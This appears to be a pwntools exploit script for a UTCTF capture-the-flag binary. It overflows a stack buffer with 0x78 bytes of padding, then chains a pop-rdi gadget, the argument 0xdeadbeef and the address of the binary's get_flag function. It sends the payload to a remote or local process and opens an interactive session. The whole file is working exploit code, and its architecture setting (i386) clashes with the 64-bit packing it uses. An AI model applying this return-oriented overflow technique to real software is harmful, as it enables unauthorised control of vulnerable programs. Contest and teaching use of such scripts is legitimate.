from pwn import *
import sys

#import kmpwn
sys.path.append('/home/vagrant/kmpwn')
from kmpwn import *
#fsb(width, offset, data, padding, roop)

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./pwnable"
HOST = "binary.utctf.live"
PORT = 9002 

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

elf = ELF(FILE_NAME)
addr_flag = elf.symbols["get_flag"]
#libc = ELF('./')
#
#main_addr = elf.symbols["main"]
#libc_binsh = next(elf.search("/bin/sh"))
#addr_bss = elf.bss()
#addr_dynsym = elf.get_section_by_name('.dynsym').header['sh_addr']
rdi_ret = 0x400693

def exploit():
	bufsize = 0x70+8
	payload = "A"*bufsize
	payload += p64(rdi_ret)
	payload += p64(0xdeadbeef)
	payload += p64(addr_flag)
	conn.recvline()
	conn.sendline(payload)
	conn.interactive()	

if __name__ == "__main__":
	exploit()	
